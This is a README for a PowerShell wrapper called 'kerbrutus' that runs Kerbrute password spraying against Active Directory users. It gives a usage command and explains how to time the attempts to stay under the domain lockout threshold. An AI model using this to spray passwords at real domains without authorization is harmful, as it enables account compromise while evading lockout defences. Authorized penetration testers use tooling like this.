# Usage

```PowerShell
.\kerbrutus.ps1 -ExecutionCount 3 -TimeWindowMinutes 30 -CommandTemplate '..\kerbrute.exe passwordspray -d domain.local .\users.txt -v "<pass>"' -PasswordsFile .\passwords.txt -OutputFile results.log
```

In `-CommandTemplate` the `<pass>` is placeholder value that will be populated in the command from the specified file in `-PasswordsFile`.
Value specified in `-OutputFile` will have all results appended to it.

## Why?

So you can continuously run Kerbrute and use it safely with the password poliicy of the AD environment you are using.

E.g.
```PowerShell
Get-ADDefaultDomainPasswordPolicy
```
```
<SNIP>
LockoutDuration             : 00:30:00
LockoutObservationWindow    : 00:30:00
LockoutThreshold            : 5
<SNIP>
```

So, as the `LockoutDuration` is `30` and the `LockoutThreshold` is `5`, you might choose to safely spray `3` passwords (for ever domain user) within a `30` minute window.
So you'd set the follow as such:
```PowerShell
-ExecutionCount 3 -TimeWindowMinutes 30
```

*NB*: Kerbrutus counts `30` minutes from when the last command finishes executing and adds 1 minute to create a buffer.
